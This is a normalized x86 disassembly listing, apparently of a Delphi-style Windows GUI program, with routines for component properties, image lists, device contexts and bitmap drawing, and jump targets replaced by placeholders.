mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_45ae68
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_45b2b8
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_45b2b8
sub_45b000
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_422384
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_45b054
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_40331c
mov eax [ esi + 0x9c ]
call sub_40331c
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45a904
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40d814
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_45b0a4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4193d8
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_45b150
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_45b1b0
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_45b2b8
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_45b3f0
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_45b450
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_45b4ac
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_45b510
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45b150
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_404524
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_40416c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4034cc
test eax eax
je r-xdata
sub_45b1b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_45b2a8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_45ac68
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4034cc
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_45ac54
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_45b1b0
sub_45b2b8
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4034cc
test eax eax
je r-xdata
sub_45b330
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_404524
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_40416c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418cf8
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418cf8
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
sub_45b398
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4034cc
test eax eax
je r-xdata
sub_45b3f0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_404524
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_40416c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4034cc
test eax eax
je r-xdata
sub_45b450
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4034cc
test eax eax
je r-xdata
sub_45b4ac
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4034cc
test eax eax
je r-xdata
sub_45b510
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_418cf8
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4034cc
test eax eax
je r-xdata
sub_45b570
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_404524
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_421fd4
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_45b150
sub_45b5bc
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_45b5e4
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_45aa70
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_45b1b0
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_45b66c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x90 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebx + 0x90 ] eax
sub_45b6a0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x90 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_45b6d0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41aefc
mov edi eax
mov eax esi
call sub_45e148
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_45b6fc
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_45b740
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45b765
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b76c
retn
sub_45b86e
inc ebp
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ eax ] dh
mov ecx 0xbf540045
inc ebp
add [ edx + edi * 4 ] bh
inc ebp
add [ esp + ecx * 8 + 0x45 ] bl
add al ch
int3
sub_45b930
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421a7c
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_45b97c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_421a7c
mov [ edi + 0x34 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x30 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_45b9d0
push ebx
push esi
push edi
call sub_4036d0
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_418de0
mov edx eax
mov eax edi
call sub_45c5c0
mov eax [ edi + 0x50 ]
call sub_40331c
mov eax edi
call sub_45bc94
mov eax [ edi + 0x4c ]
call sub_40331c
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_421ac8
test bl bl
jle r-xdata
call sub_40331c
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4036b8
sub_45ba3c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45bae9
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_45c548
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4281c4
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_45bb08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45baf0
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_45bb08
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45bba9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_4292ac
mov eax ebx
call sub_42878c
mov eax [ eax + 0x14 ]
xor edx edx
call sub_4252cc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_41766c
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_42878c
pop edx
call sub_425670
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bbb0
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_45bbcc
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_45bb08
pop ecx
pop edx
pop ebx
retn
sub_45bc04
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45bc94
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_45bbcc
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_403518
sub_45bc40
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_45c4d0
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_4287f8
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45bc94
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45baf4
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_403518
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_45bc30
push eax
call ImageList_Destroy
sub_45bccc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_45bd5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_45baf4
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bd66
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov edx eax
mov eax ebx
call sub_45bef4
sub_45bd6c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4281c4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45be1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4281c4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45bdfe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45bafc
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45bc40
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45bc40
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45be05
mov eax [ ebp - 0x10 ]
call sub_40331c
retn
sub_45be38
push ebx
mov ebx eax
mov eax ebx
call sub_45baf4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_45bc30
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_45be5c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45bedb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_45be38
cmp esi eax
jl r-xdata
mov eax ebx
call sub_45baf4
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
mov eax ebx
mov si 0xffef
call sub_403518
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bee2
lea eax [ ebp - 0x4 ]
call sub_404118
retn
push esi
mov eax ebx
call sub_45bc30
push eax
call ImageList_Remove
sub_45bef4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45baf4
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_45b8f0
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_403518
pop esi
pop ebx
retn
sub_45bf2c
push ebx
mov ebx eax
mov eax ebx
call sub_45baf4
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_45bc30
push eax
call ImageList_GetBkColor
call sub_45b910
pop ebx
retn
sub_45bf54
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_45baf4
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_45b8f0
push eax
mov eax ebx
call sub_45bf2c
call sub_45b8f0
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_425acc
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_45bc30
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_42878c
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_4252cc
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_41766c
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_42878c
pop edx
call sub_425670
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_42878c
call sub_425acc
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_45bc30
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_41766c
mov eax [ ebx + 0x54 ]
call sub_42878c
call sub_425acc
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_4252cc
mov eax edi
call sub_425acc
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_4252cc
mov eax edi
call sub_425acc
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_4281c4
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_4294fc
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_45c128
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_45c14c
pop ebx
pop ebp
retn 0xc
sub_45c14c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45baf4
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
